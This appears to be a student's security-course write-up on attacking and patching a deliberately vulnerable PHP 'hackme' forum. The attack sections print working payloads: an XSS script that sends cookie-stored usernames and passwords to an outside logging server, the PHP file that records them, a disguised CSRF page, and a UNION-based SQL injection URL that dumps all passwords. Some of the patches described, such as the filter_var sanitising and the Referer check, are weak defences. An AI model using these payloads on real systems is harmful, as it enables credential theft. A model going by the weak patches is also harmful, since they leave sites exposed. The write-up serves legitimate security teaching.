# Web Security

## Assignment Purpose

The purpose of this assignment was to gain experience analyzing a web
application for security vulnerabilities, and patching them. Our assignment
was to find authentication, cross-site scripting, cross-site request forgery,
and SQL injection vulnerabilities, and fix them. The original, vulnerable
version, as well as the fixed version, can be found in this repository.

## Authentication

### Description

The password management system for the hackme site is terrible. There are five
major issues with this site. First, it simply checks to see if there is a cookie
set called "hackme", and the value of that cookie is assumed to be the username.
No password check required, the site just assumes that you are authenticated as
that user. Second, if a user actually does register, all passwords are stored as
plaintext. This allows anyone with access to the database to see all passwords
of all users. Third, HTTPS is not used when logging in or registering for the
site. This allows anyone with a network-snooping tool (like Wireshark) to grab
this plaintext information out of the air. Fourth, no measures are in place to
prevent brute-forcing attacks. Passwords that are easy enough to guess will
inevitably be revealed to an attacker, as an automated "guess and check"
approach will get these passwords in no time. Lastly, strong passwords are not
enforced, meaning that an ignorant user can set a one-character password if he
or she chooses.

### Vulnerability 1

Since the only authentication system in place is checking the value of the
"hackme" cookie, any non-registered user can simply assume the role of a
registered user, and do anything that the registered user can do.

### Vulnerability 1 Patch

I used PHP's $\_SESSION global variable to handle information about the current
session, such as who is logged in. By using this instead of storing a cookie,
PHP does not store the authenticated user on the client side, but instead stores
a session ID to prevent users from easily bypassing the login mechanism. The
session ID is then connected to the authenticated user on the server side, so
that session functionality is still intact.

### Vulnerability 2

Registered users' passwords are also stored in the database as plaintext,
allowing anybody with access to the databases to view these passwords.

### Vulnerability 2 Patch

The password is hashed before being stored in the database, so that people with
access to the database cannot view plaintext passwords. When a user logs in, the
hash of the entered password is then compared with the hash stored in the
database, allowing password functionality to remain intact.

### Vulnerability 3

User credentials are sent "in the clear", allowing attackers to easily snatch
them out of the air.

### Vulnerability 3 Patch

Using HTTPS, so confidential information is encrypted.

### Vulnerability 4

There is no maximum amount of attempts of guessing a password, allowing an
attacker to brute-force and obtain weak passwords easily.

### Vulnerability 4 Patch

Users now only have three password attempts before they are locked out of their
account. After that, the site administrator must unlock their account.

### Vulnerability 5

A strong password scheme is not enforced, allowing ignorant users to set
one-character passwords for the sake of convenience, opening them up to attacks.

### Vulnerability 5 Patch

Passwords are now required to be more than 8 characters in length, and contain
numbers, so that the passwords are not dictionary words.

## Cross-Site Scripting

### Vulnerability

To execute this attack, I posted a thread (as shown in Example 2.1) with
embedded JavaScript code, which gets executed when the page showing the thread
loads. This JavaScript code parses the `document.cookie` JavaScript string,
and finds the username and password embedded inside it. It then sends the
username and password to an external server that accepts a username and
password as GET arguments, and logs the received credentials to a text file.
The source code that stores the usernames and passwords is shown in Example
2.2.

```html
<script>
    var unStartIndex = document.cookie.indexOf("hackme")+7;
    var unEndIndex = document.cookie.indexOf("; hackme_pass");
    var pwStartIndex = document.cookie.indexOf("hackme_pass")+12;
    var pwEndIndex = document.cookie.length;
    var un = document.cookie.substring(unStartIndex, unEndIndex);
    var pw = document.cookie.substring(pwStartIndex, pwEndIndex);
    var params = "?un=" + un + "&pw=" + pw;
    var xhttp = new XMLHttpRequest();
    xhttp.open("GET", "http://cse.taylor.edu/~jluscomb/xss.php"+params, false);
    xhttp.send();
</script>
```
**Example 2.1**: The malicious message that leverages the XSS attack.

```php
<?php
    $file = fopen("/home/CS/users/jluscomb/.linux/tmp/passwords.txt", "a");
    fwrite($file, $_GET['un']."/".$_GET['pw']."\n");
```
**Example 2.2**: The source code that stores the usernames and passwords.

### Patch

To patch this vulnerability, all I had to do was simply call PHP's provided
`filter_var()` function with the title and message of the thread, and it did
all the work of taking the `<script>` tags out, eliminating the XSS
vulnerability.

## Cross-Site Request Forgery

### Vulnerability

To execute this attack, I created a malicious web page that encourages the user
to click a button to show a typo. Upon clicking this button, the user
unknowingly submits a form that posts a thread on the hackme site. A user might
be lured to visit the malicious website through a phishing email advertising,
in this particular case, funny typos. The user is tricked into visiting the
site and clicking the button, falling victim to a CSRF attack. The malicious
web page that implements the CSRF attack is shown in Example 3.1.

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Typos</title>
</head>
<body>
    <h1>All the typos on the <em>interenet</em>!</h1>
    <form action="http://10.121.20.109/hackme/post.php" method="post">
        <input type="hidden" name="title" value="You won!" />
        <input type="hidden" name="message" value="You have been selected for a free flying dragon ride." />
        <input type="submit" name="post_submit" value="View a typo" />
    </form>
</body>
</html>
```
**Example 3.1**: The source code that implements the CSRF attack.

### Patch

To patch this vulnerability, I added some PHP code that checks the HTTP referer
before allowing the thread submission. That way, the page ignores any requests
with HTTP referers outside of the site.

## SQL Injection

### Vulnerability

To execute this attack, I examined the source code for a query that uses string
concatenation, and whose results are returned in the HTML. One such
vulnerability was in the query to display all threads on the site, under the
`show.php` page. The query beings with `SELECT * FROM threads WHERE id = `, and
fills in the ID with an unsanitized GET parameter. I used this parameter to
complete the query with something that would return the username and passwords
of all users, as shown in Example 4.1.

```
http://10.121.20.109/hackme/show.php?pid=' UNION SELECT null AS id, username, CONCAT(username, "'s
password") AS title, CONCAT('The password for ', username, ' is: ', pass) AS message,
UNIX_TIMESTAMP(NOW()) AS date FROM users WHERE username LIKE '%
```
**Example 4.1**: The HTTP request that leverages the SQL injection attack. Line
breaks are added for convenience.

### Patch

To patch this vulnerability, I replaced all of the unsafe SQL queries with
prepared statements. According to W3Schools, with prepared statements,
parameter values are transmitted after the SQL statement template, using a
different protocol. This eliminates the problem of SQL statement templates
being derived from external output, which allowed for SQL injection in the
first place. With this problem eliminated, the SQL injection vulnerability
is no longer a problem.
